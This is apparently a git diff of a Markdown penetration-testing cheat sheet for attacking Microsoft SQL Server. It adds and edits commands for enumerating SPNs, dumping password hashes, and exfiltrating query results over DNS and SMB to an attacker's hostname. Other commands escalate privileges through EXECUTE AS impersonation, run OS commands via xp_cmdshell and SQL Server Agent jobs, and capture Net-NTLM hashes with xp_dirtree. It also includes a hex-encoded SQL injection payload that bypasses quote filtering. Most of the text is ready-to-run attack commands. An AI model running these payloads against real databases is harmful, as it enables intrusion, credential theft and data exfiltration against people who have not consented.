@@ -15,15 +15,15 @@ to conduct the search:
 
 ```ruby
 # List the SPN containing "MSSQL" to detect if any abnormality is present in any SPN naming
-Get-ADUser -Filter { servicePrincipalName -like "*MSSQL*" } -Properties servicePrincipalName | Select-Object SamAccountName,servicePrincipalName
+Get-ADObject -Filter { servicePrincipalName -like "*MSSQL*" } -Properties servicePrincipalName | Select-Object SamAccountName,servicePrincipalName
 
 # List the hostname specified in the SPNs referencing a MSSQL service
-Get-ADUser -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
+Get-ADObject -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
 
 # Using credentials from another domain
 $secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
-Get-ADUser -Server <DC_IP> -Credential $creds -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
+Get-ADObject -Server <DC_IP> -Credential $creds -Filter { servicePrincipalName -like "MSSQL*" } -Properties servicePrincipalName | Select -Expand servicePrincipalName | Where { $_ -like "MSSQL*" } | ForEach { $_.split('/')[1] }
 
 # Use the current user login (NTLM / Kerberos tickets)
 Get-SQLInstanceDomain -Verbose
@@ -109,6 +109,25 @@ The `DBeaver` GUI tool can be used to simply access the database content
 through a graphical interface without the need to know the underlying MSSQL
 query syntax.
 
+###### Basic data retrieval queries
+
+| Description | Queries |
+|-------------|---------|
+| Comments | |
+| Encoding queries | |
+| Obfuscating queries | |
+| Disable logging mechanisms | |
+| MSSQL version | `SELECT @@version` |
+| Current database username | `SELECT USER_NAME()` <br><br> `SELECT CURRENT_USER` |
+| Current logged in account | `SELECT SYSTEM_USER` |
+| List the users in the current database | `SELECT name, create_date, modify_date, type_desc, authentication_type_desc FROM sys.database_principals ORDER BY create_date DESC` |
+| Users' passwords | Using `sqlmap`: <br> `sqlmap -D master -T sys.sql_logins --dump [...]` |
+| Current database | `SELECT DB_NAME()` |
+| Databases | `SELECT name FROM master.sys.databases` |
+| List tables of the specified database | `SELECT TABLE_NAME FROM [<DATABASE>].INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'` |
+| List columns of the specified table | `SELECT COLUMN_NAME FROM [<DATABASE>].INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '<TABLE>' ORDER BY ORDINAL_POSITION` |
+| Select all data from the specified table | `SELECT * FROM <TABLE>` <br><br> `SELECT * FROM [<DATABSE>].<. \| dbo \| SCHEMA>.<TABLE>` |
+
 ###### Dump hashes
 
 If provided with an user credentials of appropriate DB privileges, the `nmap`
@@ -120,9 +139,17 @@ from an MSSQL server in a format suitable for cracking by tools such as
 nmap -v -sT -p <PORT> --script=MSSQL-dump-hashes.nse --script-args='mssql.username=<USERNAME>,mssql.password=<PASSWORD>' <IP>
 ```
 
+###### Out-of-band data exfiltration
+
+| Description | Queries |
+|-------------|---------|
+| DNS request | `SELECT LOAD_FILE(concat('\\\\', (<SELECT_QUERY_ONE_ROW_RESULT>), '.<HOSTNAME>\\'))` |
+| SMB request | `SELECT <...> INTO OUTFILE '\\<HOSTNAME>\<SMB_SHARE>\<OUTPUT_FILE>'` |
+| HTTP request | X |
+
 ### Privileges escalation
 
-###### MSSQL server-level and database-level roles
+###### MSSQL server-level and database-level roles overview
 
 MSSQL provides a roles mechanism which, similarly to groups in the Microsoft
 Windows operating system, makes use of security principals that group other
@@ -167,35 +194,38 @@ The following table shows the fixed-database roles and their capabilities:
 ###### Enumerate user's roles and permissions
 
 ```sql
--- Returns the name of the current security context.
+-- Returns the name of the database user name / current security context.
 SELECT USER_NAME()
 SELECT CURRENT_USER
 
--- Returns the login identification name, DOMAIN\USERNAME for Windows authentication USERNAME for SQL Server Authentication
--- If the user name and login name are different, SYSTEM_USER returns the login name
+-- Returns the login identification name, DOMAIN\USERNAME for Windows authentication USERNAME for SQL Server Authentication.
+-- If the user name and login name are different, SYSTEM_USER returns the login name.
 SELECT SYSTEM_USER
 SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID
 
--- Is the current user sysadmin or serveradmin
+-- Is the current user sysadmin or serveradmin.
 SELECT IS_SRVROLEMEMBER('sysadmin')
 SELECT IS_SRVROLEMEMBER('serveradmin')
 
--- Is the specified user (login name) sysadmin or serveradmin
+-- Is the specified user (login name) sysadmin or serveradmin.
 SELECT IS_SRVROLEMEMBER('sysadmin', '<USERNAME>')
 SELECT IS_SRVROLEMEMBER('serveradmin', '<USERNAME>')
 
--- List specified user's roles
+-- Lists the specified user's fixed-database roles.
 SELECT u.name, r.name FROM sys.database_role_members AS m INNER JOIN sys.database_principals AS r ON m.role_principal_id = r.principal_id INNER JOIN sys.database_principals AS u ON u.principal_id = m.member_principal_id WHERE u.name = '<USERNAME>';
 
--- List current users permissions
+-- Lists the current users permissions.
 SELECT entity_name, permission_name FROM sys.fn_my_permissions(NULL, NULL)
 
--- List users with the sysadmin role
+-- Lists the users with the sysadmin role.
 exec sp_helpsrvrolemember @srvrolename='sysadmin'
 SELECT 'Name' = sp.NAME,sp.is_disabled AS [Is_disabled] FROM sys.server_role_members rm inner join sys.server_principals sp on rm.member_principal_id = sp.principal_id WHERE rm.role_principal_id = SUSER_ID('sysadmin')
 
--- List users with the sysadmin role or "Control Server" permission
+-- Lists the users with the sysadmin role or "Control Server" permission
 SELECT DISTINCT p.name AS [loginname], p.type, p.type_desc, p.is_disabled, s.sysadmin, CONVERT(VARCHAR(10), p.create_date ,101) AS [created],CONVERT(VARCHAR(10), p.modify_date, 101) AS [update] FROM sys.server_principals p JOIN sys.syslogins s ON p.sid = s.sid JOIN sys.server_permissions sp ON p.principal_id = sp.grantee_principal_id WHERE p.type_desc IN ('SQL_LOGIN', 'WINDOWS_LOGIN', 'WINDOWS_GROUP') AND p.name NOT LIKE '##%' AND (s.sysadmin = 1 OR sp.permission_name = 'CONTROL SERVER') ORDER BY p.name
+
+-- Lists the users' fixed-database role(s) in the current database.
+SELECT db_name(), r.[name], p.[name] FROM sys.database_role_members m JOIN sys.database_principals r ON m.role_principal_id = r.principal_id JOIN sys.database_principals p ON m.member_principal_id = p.principal_id;
 ```
 
 ###### IMPERSONATE permission
@@ -207,7 +237,10 @@ user he is allowed to impersonate, resulting in a potential elevation of
 privileges.    
 
 This permission is implied for the `sysadmin` role for all databases, and
-the `db_owner` role members in databases that they own.
+the `db_owner` role members in databases that they own. Indeed, impersonation
+of a login (`EXECUTE AS LOGIN`) grants server level permissions (of the
+impersonated login) while the impersonation of an user (`EXECUTE AS USER`) only
+grant permissions at the database level.
 
 The following queries can be used to exploit the `IMPERSONATE` permission:
 
@@ -215,8 +248,12 @@ The following queries can be used to exploit the `IMPERSONATE` permission:
 -- List the SQL Server logins that can be impersonated by the current user
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 
--- Swith the execution context of the session to the specified user. Requires the IMPERSONATE permission on the specified user.
-EXECUTE AS LOGIN = '<USERNAME>'
+-- Swith the execution context of the session to the specified login. Requires the IMPERSONATE permission on the specified login.
+EXECUTE AS LOGIN = '<LOGIN>';
+EXECUTE AS LOGIN = '<DOMAIN>\\<LOGIN>';
+
+-- Swith the execution context in the database to the specified user. Requires the IMPERSONATE permission on the specified user.
+EXECUTE AS USER = '<USER>';
 ```
 
 The `Metasploit`'s `auxiliary/admin/mssql/mssql_escalate_execute_as` module and
@@ -367,6 +404,8 @@ Get-SQLServerInfo -Verbose -Instance <HOSTNAME | IP>\<INSTANCE>
 
 ### Linked servers
 
+###### Overview
+
 The linked server mechanism allows for access to others `Object Linking and
 Embedding, Database (OLE DB)` data sources outside of the present MSSQL
 instance. The mechanism can be used at the database level to connect to and
@@ -443,9 +482,16 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 
 ### OS commands execution
 
-On MSSQL server, operating system commands can be executed using the
-*xp_cmdshell* function. The *xp_cmdshell* function is deactivated by default
-from SQL Server 2000 and upwards and needs to be activated.  
+#### xp_cmdshell
+
+The `xp_cmdshell` extended procedure can be used to execute system commands
+given that the account making the queries has sufficient privileges on the SQL
+service. The `xp_cmdshell` function is deactivated by default starting from
+`SQL Server 2000` and upwards and needs to be activated. Its re activation
+requires elevated privileges.
+
+As with any stored procedure, `xp_cmdshell` needs to be called through stacked
+queries.
 
 Note that the Windows process spawned by `xp_cmdshell` has the same security
 rights as the SQL Server service account running the service.
@@ -705,6 +751,85 @@ shell()
 sys.exit()
 ```
 
+#### SQL Server Agent
+
+###### Overview
+
+The `SQL Server Agent` is a Windows service that executes scheduled
+tasks, denominated `SQL Server Agent jobs`. `SQL Server Agent` is available is
+all versions of `SQL server`, except `SQL Server Express`, **but is disabled by
+default**.
+
+In order to fulfil its function, the `SQL Server Agent` Windows service must be
+run using an account having the `sysadmin` fixed server role in `SQL Server` as
+well as the following Windows privileges: `SeServiceLogonRight`,
+`SeAssignPrimaryTokenPrivilege`, `SeChangeNotifyPrivilege`, and
+`SeIncreaseQuotaPrivilege`.
+
+The `SQL Server Agent jobs` can be executed:
+  - through a `SQL Agent schedule`, for example at a recurring interval or at a
+    specific timestamp. A job can be associated with multiple schedules, and
+    reciprocally, a schedule can dictate the execution of multiple jobs.
+  - upon the triggering of a `SQL Agent alert`, for example in response to an
+    event such as another job execution or the reaching of a system resources
+    usage threshold.
+  - **directly by executing the `sp_start_job` stored procedure.**
+
+A `SQL Server Agent job` is composed of (at least) one or multiple steps, each
+step being assigned to a specific `SQL Server Agent` subsystem. It is possible
+to execute operating system commands using the following subsystems:
+  - `CmdExec`: run an executable with the specified command line option, such
+    as `cmd.exe /c <COMMAND>` for example.
+  - `PowerShell`: run a PowerShell script, by specifying either the PowerShell
+    code directly or a PowerShell script file.   
+  - `ActiveX`: run an `ActiveX` script. Note that the `ActiveSscripting`
+    subsystem is discontinued since `SQL Server 2016` (included).
+
+Note that a `SQL Server Agent job` can run locally on the `SQL Server` they are
+configured as well as on one or multiple remote servers.
+
+The permissions to configure, execute, and delete `SQL Server Agent jobs` are
+governed by the following fixed database roles:
+
+| Role | Scope | Notable associated permissions |
+|------|-------|--------------------------------|
+| `sysadmin` | Fixed-server role. | Can administrate and execute any jobs, regardless of the job's owner. <br><br> Is the only role that can define new `proxy accounts`. <br> Additionally, can define and execute jobs that will run as the `SQL Server Agent` Windows service account. <br><br> By default, only the members of the `sysadmin` fixed server role can setup a multi-servers environment. |
+| `SQLAgentUserRole` | `msdb` database fixed-database role. | Can create and execute local jobs under their own security context or using the identity of an existing `proxy account`. <br><br> Can enumerate, modify, or delete jobs they own. <br><br> By default, cannot delete the job history of the jobs they own. <br> Cannot enumerate, administrate, or execute jobs they don't own. |
+| `SQLAgentReaderRole` | `msdb` database fixed-database role. | Includes the permissions of the `SQLAgentUserRole` role. <br><br> Can additionally enumerate and view the properties / history of all local or multi-servers jobs. |
+| `SQLAgentOperatorRole` | `msdb` database fixed-database role. | Includes the permissions of the `SQLAgentUserRole` and `SQLAgentReaderRole` roles. <br><br> Can additionally execute, stop, and enable / disable all local jobs and their job history. <br><br> Cannot however modify or delete jobs they don't own (nor make use of multi-servers jobs). |
+
+###### Verify prerequisites
+
+In order to execute `SQL Server Agent jobs`:
+  - the `SQL Server Agent` Windows service must be running.
+  - the current user must have sufficient privileges.
+
+```
+# Checks whether the SQL Server Agent Windows service is running or not.
+SELECT dss.[status], dss.[status_desc] FROM sys.dm_server_services dss WHERE  dss.[servicename] LIKE N'SQL Server Agent (%';"
+
+
+SELECT IS_SRVROLEMEMBER('sysadmin', '<USERNAME>')
+EXEC sp_helprolemember 'SQLAgentUserRole';
+EXEC sp_helprolemember 'SQLAgentReaderRole';
+EXEC sp_helprolemember 'SQLAgentOperatorRole';
+```
+
+###### SQL Server Agent jobs enumeration
+
+```
+# Lists the defined MSSQL jobs.
+SELECT job_id, [name] FROM msdb.dbo.sysjobs;
+```
+
+https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189237(v=sql.105)
+https://docs.microsoft.com/fr-fr/sql/ssms/agent/create-an-activex-script-job-step?view=sql-server-2016
+https://www.mssqltips.com/sqlservertip/2014/replace-xpcmdshell-command-line-use-with-sql-server-agent/
+
+Delete job history:
+
+https://docs.microsoft.com/fr-fr/sql/ssms/agent/clear-the-job-history-log?view=sql-server-ver15
+
 ### Net-NTLM stealer and relaying
 
 The (undocumented) `xp_dirtree`, `xp_fileexist` and `xp_getfiledetails` SQL
@@ -729,7 +854,7 @@ To capture the `Net-NTLM` response, a `SMB` share service or `Responder` must
 be started:
 
 ```bash
-smbserver.py -smb2support <SHARE_NAME> /tmp
+smbserver.py -smb2support <SHARE_NAME> <LOCAL_DIRECTORY>
 
 Responder.py -I <INTERFACE>
 ```
@@ -739,10 +864,16 @@ connection to the `SMB` service:
 
 ```sql
 -- METHOD = xp_dirtree / xp_fileexist / xp_getfiledetails
-<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
-EXEC <METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
-EXEC <METHOD> '\\<HOSTNAME | IP>\Whatever_Share',1,1;
-EXEC master.dbo.<METHOD> '\\<HOSTNAME | IP>\Whatever_Share';
+<METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>';
+EXEC <METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>';
+EXEC <METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>',1,1;
+EXEC master.sys.<METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>';
+EXEC master..<METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>';
+EXEC master.dbo.<METHOD> '\\<HOSTNAME | IP>\<WHATEVER_SHARE>';
+
+# To bypass single quote issues in SQL injection, the following may be used.
+# Example: \\<IP>\<FAKE_SHARE> -> 0x5c5c3c49503e5c3c46414b455f53484152453e
+1;DECLARE @varshare VARCHAR(8000);SET @varshare=<0xHEX_ENCODED_PATH>;EXEC master.sys. <METHOD> @varshare--
 ```
 
 The `metasploit` module `auxiliary/admin/mssql/mssql_ntlm_stealer` and the
